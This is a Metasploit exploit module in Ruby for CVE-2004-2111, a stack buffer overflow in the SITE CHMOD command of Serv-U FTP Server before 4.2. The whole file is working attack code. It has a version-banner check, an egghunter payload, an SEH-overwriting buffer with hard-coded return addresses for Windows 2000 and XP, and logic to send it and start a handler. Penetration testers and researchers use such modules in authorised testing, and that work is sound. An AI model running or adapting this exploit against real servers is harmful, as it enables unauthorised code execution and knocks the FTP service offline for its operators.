##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Egghunter
	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Serv-U FTP Server <4.2 Buffer Overflow\',
			\'Description\'    => %q{
				This module exploits a stack buffer overflow in the site chmod command
				in versions of Serv-U FTP Server prior to 4.2.

				You must have valid credentials to trigger this vulnerability. Exploitation
				also leaves the service in a non-functional state.
			},
			\'Author\'         => \'thelightcosine <thelightcosine[at]metasploit.com>\',
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision$\',
			\'References\'     =>
				[
					[ \'CVE\', \'2004-2111\'],
					[ \'BID\', \'9483\'],
				],
			\'Privileged\'     => true,
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'thread\',
				},
			\'Payload\'        =>
				{
					\'BadChars\'    => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",
					\'DisableNops\' => true,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[ \'Windows 2000 SP0-4 EN\', {
						\'Ret\'    => 0x750212bc, #WS2HELP.DLL
						\'Offset\' => 396 } ],
					[ \'Windows XP SP0-1 EN\', {
						\'Ret\'    => 0x71aa388f, #WS2HELP.DLL
						\'Offset\' => 394 } ]
				],
			\'DisclosureDate\' => \'Dec 31 2004\',
			\'DefaultTarget\'  => 0))
	end

	def check
		connect
		disconnect

		if (banner =~ /Serv-U FTP Server v((4.(0|1))|3.\\d)/)
			return Exploit::CheckCode::Vulnerable
		end
			return Exploit::CheckCode::Safe
	end


	def exploit
		connect_login

		eggoptions =
		{
			:checksum => true,
			:eggtag => \"W00T\"
		}

		hunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)


		buffer = \"chmod 777 \"
		buffer <<  make_nops(target[\'Offset\'] - egg.length - hunter.length)
		buffer << egg
		buffer << hunter
		buffer << \"\\xeb\\xc9\\x41\\x41\"	#nseh, jump back to egghunter
		buffer << [target.ret].pack(\'V\')	#seh
		buffer << rand_text(5000)

		print_status(\"Trying target #{target.name}...\")

		send_cmd( [\'SITE\', buffer] , false)

		handler
		disconnect
	end

end
